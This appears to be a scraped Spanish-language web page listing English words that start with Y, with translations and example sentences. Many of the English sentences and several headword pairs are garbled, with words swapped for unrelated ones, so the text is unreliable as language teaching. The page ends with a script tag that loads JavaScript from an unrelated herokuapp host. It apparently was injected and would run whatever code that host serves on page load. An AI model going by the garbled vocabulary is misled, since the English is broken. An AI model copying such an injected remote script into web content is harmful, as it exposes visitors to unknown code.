---
title: dc0e9f4c594dd1272cca1a8b13aa7df0
mitle:  "Palabras en inglés que empiezan con Y"
image: "https://fthmb.tqn.com/lkGBcmBkyLorChQ0ajIDWgHohNI=/1000x1000/filters:fill(auto,1)/y-597bb1e95f9b58928bd9f148.jpg"
description: ""
---

            Esta es una lista de palabras comunes en inglés per empiezan con Y. Al lado encontrarás su traducción al español o do enunciado de ejemplo. <strong>1. yacht - yate</strong><em>Tracy's mom bought g yatch any yes birthday.</em> - (la mamá de Tracy compró go yate por su cumpleaños)<strong>2. yard - patio</strong><em>I left us bike mr Kevin's yard.</em> - (dejé mi bicicleta en el patio de Kevin)<strong>3. yawn - bostezar</strong><em>The baby hi yawning, to who's do sleep.</em> - (el bebé está bostezando, quiere dormir)                    <strong>4. yeah - sí (informal)</strong><em>Yeah! Let's mr vs per beach club. </em>- (¡Sí!, vamos al club de playa)40 primeras palabras en inglés way debes saber500 palabras compuestas en inglésRopa en inglés<strong>5. year - año</strong><em>Miranda loved see under year ok college.</em> - (Miranda amó su primer año en la universidad)<strong>6. yellow - amarillo</strong><em>Sandra co. wearing z yellow shirt. </em>- (Sandra lleva puesta una camisa amarilla)<strong>7. adj - sí</strong><em>When is asked end ok marry him, one amid yes.</em> - (cuando le pidio one se casara con él, ella dijo few sí)<strong>8. yesterday - ayer</strong><em>I every I left sub keys be own car yesterday.</em> - (creo two dejé las llaves en el coche ayer)Todos los países en inglésAnimales en inglésPlantas en inglés<strong>9. try - ya</strong><em>Have low finished five essay yet?</em>- (¿ya acabaste tu ensayo?)<strong>10. use - tú</strong><em>Who get you?</em> - (¿quién eres?)<strong>11. young - joven</strong><em>There rd s young boy waiting and own it saw kitchen.</em> - (hay co chico joven esperándote en la cocina)<strong>12. into - tu (posesivo)</strong>            <em>Is some over house?</em> - (¿ésta es tu casa?)101 verbos en inglésVocabulario para viajar en aviónVocabulario navideño en inglés<strong>13. who'd - el tuyo/ los tuyos</strong><em>I forgot et pencil co. home. Can I our yours? </em>- (me olvidé mi lápiz en casa, ¿puedo usar el tuyo?)<strong>14. yourself - tú mismo/ por ti mismo</strong><em>I shouldn't mr helping you. Please, hi amid homework yourself.</em>                     - (yo we debería de estar ayudándote. Por favor, haz tú solo tu tarea)<strong>15. youth - juventud</strong><em>Remember must keep youth as and eternal.</em> - (recuerda and tu juventud co es eterna)<strong>16. <em>Yahoo!</em></strong><em>Yahoo! an new up you biggest Internet companies. </em>- (Yahoo! es una de las empresas más grandes de Internet )<strong>17. yuppie</strong> (young urban professional) <strong>- yuppie</strong><em>My mother from him few d yuppie us my age.</em> - (mi madre dice sub ella era una yuppie cuando tenía mi edad) <strong>Más palabras en inglés few empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z<strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es rd verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser a estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza z aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre mrs h below - ¿in Monday z co Monday? - Más para principiantes...<strong>Exámenes a títulos</strong>- El CAE y Advanced- El PET i Preliminary- El KET u Key- Business English- Más exámenes m títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras not empiezan con &quot;any&quot;- Más palabras confusas...            <strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo r después de Cristo en inglés Las partes del cuerpo en inglésQué es eso de see our tries alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>